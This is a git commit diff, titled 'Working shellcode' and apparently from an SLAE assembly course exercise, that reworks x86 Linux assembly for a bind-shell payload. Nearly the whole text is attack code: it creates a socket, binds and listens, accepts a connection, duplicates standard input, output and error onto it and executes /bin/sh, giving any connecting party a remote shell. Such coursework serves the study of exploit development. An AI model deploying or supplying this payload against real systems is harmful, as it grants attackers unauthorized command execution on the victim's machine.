2c86837bfa4c0c133c93b0a73de3769367781e5a
Adrian CITU <citu_adrian@yahoo.com>
2015-08-16 22:10:22 +0200

    Working shellcode

--- slae1/SocketServer.asm
+++ slae1/SocketServer.asm
@@ -6,17 +6,12 @@ global _start
     
 section .text
 
-CleanRegistersProc:
-	xor eax, eax
-	xor ebx, ebx
-	xor ecx, ecx
-	xor edx, edx
-	ret
-
 OpenSocket:
+   
     pop edi ;save next instruction after call because we will play with the stack
-    
-    call 	CleanRegistersProc
+     
+    xor eax,eax
+    xor ebx, ebx
     mov al, 102 ; linux syscall socketcall     
 	
    ; build the argument array on the stack
@@ -30,13 +25,15 @@ OpenSocket:
 	
 	mov esi, eax
 	push edi; store the next instruction after call
+	
+	call BindSocket
 	ret
 	
 BindSocket:
-
     pop edi ;save next instruction after call because we will play with the stack
 
-    call CleanRegistersProc    
+    xor eax, eax
+    xor ebx, ebx    
     mov al, 102 ; linux syscall socketcall
  
     ; build sockaddr struct on the stack
@@ -54,13 +51,16 @@ BindSocket:
     int 0x80      
     
     push edi
+    
+    call ListenSocket
     ret 
     
 ListenSocket:
 
 	pop edi ;save next instruction after call because we will play with the stack
 
-    call CleanRegistersProc	
+    xor eax, eax
+    xor ebx, ebx	
 	mov al, 102  ; linux syscall socketcall
 	mov bl, 4    ; 4 = SYS_LISTEN = listen()
     
@@ -71,11 +71,15 @@ ListenSocket:
     int 0x80      ; kernel interrupt		
 	
 	push edi
+	call AcceptSocket
 	ret
 
 AcceptSocket:
     pop edi ;save next instruction after call because we will play with the stack
-    call CleanRegistersProc
+   
+    xor eax, eax
+    xor ebx, ebx 
+    xor edx, edx
     
     mov al, 102    ; linux syscall socketcall
     mov bl, 5      ; 5 = SYS_ACCEPT = accept()
@@ -88,56 +92,72 @@ AcceptSocket:
     int 0x80                ; kernel interrupt. eax will hold the connected socket file descriptor
     
     mov esi, eax            ;store the new file descriptor
+    
+    call Dup2OutInErr
     push edi
     ret
     
 Dup2OutInErr:
     
     pop edi ;save next instruction after call because we will play with the stack
-    call CleanRegistersProc
+	
+	xor eax, eax
+    xor ebx, ebx 	
     
     mov al, 63            ; linux syscall dup2
     mov ebx, esi
     xor ecx, ecx            ; duplicate stdin
     int 0x80 
     
-    call CleanRegistersProc
+	xor eax, eax
+    xor ebx, ebx
     mov al, 63            ; linux syscall dup2
     mov ebx, esi
     inc ecx                    ; duplicate stdout, ebx still holds the socket fd
     int 0x80  
     
-    call CleanRegistersProc
+    xor eax, eax
+    xor ebx, ebx
     mov al, 63            ; linux syscall dup2
     mov ebx, esi
     inc ecx
     inc ecx               ; duplicate stdout, ebx still holds the socket fd
     int 0x80  
     
+    call ExecuteBinSh
     push edi
+    
     ret
 
 ExecuteBinSh:
     pop edi ;save next instruction after call because we will play with the stack
     
-    call CleanRegistersProc
-    mov al, 11              ; linux syscall execve
-    mov ebx, edi     ; pointer to the programm that should get executed
-    push ecx                ; push ecx to the stack
-    mov ecx, esp            ; pointer for argv
-    mov edx, esp            ; pointer for envp
-    int 0x80                ; kernel interrupt
+    xor eax, eax
+    xor ebx, ebx
+    xor ecx, ecx
+	
     
+    xor eax, eax    ; zero out eax
+    push eax        ; push null bytes (terminate string)
+    push 0x68732f2f ; //sh
+    push 0x6e69622f ; /bin
+    mov ebx, esp    ; load address of /bin/sh
+     
+    push eax ; set argument t 0x0
+	mov ecx, esp ;save the pointer to argument envp
+ 
+	push eax ; set argument t 0x0
+	mov edx, esp ;save the pointer to argument ptr
+    
+    mov al, 11 ; linux syscall execve
+    int 0x80 ; execute syscall
+ 
     push edi
     ret
 
-call_shellcode :
-    call OpenSocket     
-    call BindSocket
-    call ListenSocket
-    call AcceptSocket
-    call Dup2OutInErr
-    call ExecuteBinSh	
-	bashstring: db "/bin/sh", 0x0 ; path to the programm we want to execute
 _start:
-   jmp short call_shellcode 
+    call OpenSocket     
+	;bashstring: db "/bin/sh", 0x0 ; path to the programm we want to execute
+    
+    
+     
